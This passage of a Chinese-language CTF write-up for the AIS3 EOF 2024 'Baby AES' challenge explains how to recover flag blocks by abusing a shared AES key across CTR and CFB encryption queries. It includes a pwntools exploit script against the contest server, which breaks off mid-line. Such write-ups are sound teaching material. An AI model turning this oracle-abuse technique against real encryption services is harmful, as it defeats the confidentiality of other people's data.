transform="translate(1372,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1857,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2429,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3029,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(3390,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(3856,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(4743.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>.</p><p>透過同樣的手法, 把上方第二個 query 的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="8.608ex" height="1.791ex" role="img" focusable="false" viewBox="0 -626 3804.6 791.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(433,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(918,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1490,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2090,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(2451,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(2917,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></g></svg></mjx-container> 的地方改成其他我們想要取得 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.299ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1900 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> 的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container>, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="11.612ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5132.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(1372,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1857,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2429,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3029,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(3390,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(3856,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(4743.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> 改成對應的 counter 就可以達成目的.</p><p>所以 <code>c2[:16]</code>, <code>c2[:16]</code> 也都拿得到了, 就取得 <code>flag[:16]</code> 了. 同樣的, <code>flag[16:32]</code> 也可以透過一樣的方法取得, 只是要對題目進行的二次的連線, 因為題目一次只能有 5 個 query.</p><p><img src="/ais3-eof-2024-write-up/baby-aes-handwritten.webp" alt="Baby AES"></p><h5 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b, bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XOR</span> (a, b):</span><br><span class="line">    <span class="keyword">return</span> l2b(b2l(a) ^ b2l(b)).rjust(<span class="built_in">len</span>(a), <span class="string">b"\x00"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">counter_add</span>(<span class="params">iv</span>):</span><br><span class="line">    <span class="keyword">return</span> l2b(b2l(iv) + <span class="number">1</span>).rjust(<span class="number">16</span>, <span class="string">b"\x00"</span>)</span><br><span class="line"></span><br><span class="line">io = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_init</span>():</span><br><span class="line">    t = io.recvline().decode()</span><br><span class="line">    ctr0, c1 = re.findall(<span class="string">r"b'([A-Za-z0-9+/=]+)'"</span>, t)</span><br><span class="line"></span><br><span class="line">    t = io.recvline().decode()</span><br><span class="line">    _, c2 = re.findall(<span class="string">r"b'([A-Za-z0-9+/=]+)'"</span>, t)</span><br><span class="line"></span><br><span class="line">    t = io.recvline().decode()</span><br><span class="line">    _, c3 = re.findall(<span class="string">r"b'([A-Za-z0-9+/=]+)'"</span>, t)</span><br><span class="line"></span><br><span class="line">    ctr0 = b64decode(ctr0)</span><br><span class="line">    c1 = b64decode(c1)</span><br><span class="line">    c2 = b64decode(c2)</span><br><span class="line">    c3 = b64decode(c3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ctr0, c1, c2, c3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_CTR</span>(<span class="params">pt</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b'What operation mode do you want for encryption? '</span>, <span class="string">b'CTR'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'What message do you want to encrypt (in base64)? '</span>, b64encode(pt))</span><br><span class="line">    t = io.recvline().decode()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(b64decode, re.findall(<span class="string">r"b'([A-Za-z0-9+/=]+)'"</span>, t)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_CFB</span>(<span class="params">pt</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b'What operation mode do you want for encryption? '</span>, <span class="string">b'CFB'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'What message do you want to encrypt (in base64)? '</span>, b64encode(pt))</span><br><span class="line">    t = io.recvline().decode()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(b64decode, re.findall(<span class="string">r"b'([A-Za-z0-9+/=]+)'"</span>, t)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_enc</span>(<span class="params">prev_enc, pt</span>):</span><br><span class="line">    m = xor(prev_enc, pt)+<span class="built_in">bytes</span>(<span class="number">16</span>)</span><br><span class="line">    _, t = AES_CFB(m)</span><br><span class="line">    <span class="keyword">return</span> t[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step1: get the first block of the flag (see ctf.goodnotes p21).</span></span><br><span class="line">    io = remote(<span class="string">'chal1.eof.ais3.org'</span>, <span class="number">10003</span>)</span><br><span class="line">    ctr0, r1, r2, r3 = do_init()</span><br><span class="line">    r1_lo, r1_hi = r1[<span class="number">16</span>:], r1[:<span class="number">16</span>]</span><br><span class="line">    r2_lo, r2_hi = r2[<span class="number">16</span>:], r2[:<span class="number">16</span>]</span><br><span class="line">    r3_lo, r3_hi = r3[<span class="number">16</span>:], r3[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.1: Get f(CTR3~CTR7) by abusing the CTR mode.</span></span><br><span class="line">    encrypted_ctr = [<span class="built_in">bytes</span>(<span class="number">16</span>), <span class="built_in">bytes</span>(<span class="number">16</span>), <span class="built_in">bytes</span>(<span class="number">16</span>)]</span><br><span class="line">    ctr = [ctr0]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>): ctr += [counter_add(ctr[-<span class="number">1</span>])]</span><br><span class="line">    m = <span class="built_in">bytes</span>(<span class="number">16</span>) * <span class="number">5</span></span><br><span class="line">    _, t = AES_CTR(m)</span><br><span class="line">    encrypted_ctr += [t[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(t), <span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.2: Get c1_hi by getting f(CTR0) by using CFB mode.</span></span><br><span class="line">    encrypted_ctr[<span class="number">0</span>] = AES_enc(encrypted_ctr[<span class="number">4</span>], ctr0)</span><br><span class="line">    c1_hi = xor(r1_hi, encrypted_ctr[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.3: Get c2_hi by getting f(CTR1) by using CFB mode.</span></span><br><span class="line">    encrypted_ctr[<span class="number">1</span>] = AES_enc(encrypted_ctr[<span class="number">5</span>], ctr[<span class="number">1</span>])</span><br><span class="line">    c2_hi = xor(r2_hi, encrypted_ctr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.4: Get c3_hi by getting f(CTR2) by using CFB mode.</span></span><br><span class="line">    encrypted_ctr[<span class="number">2</span>] = 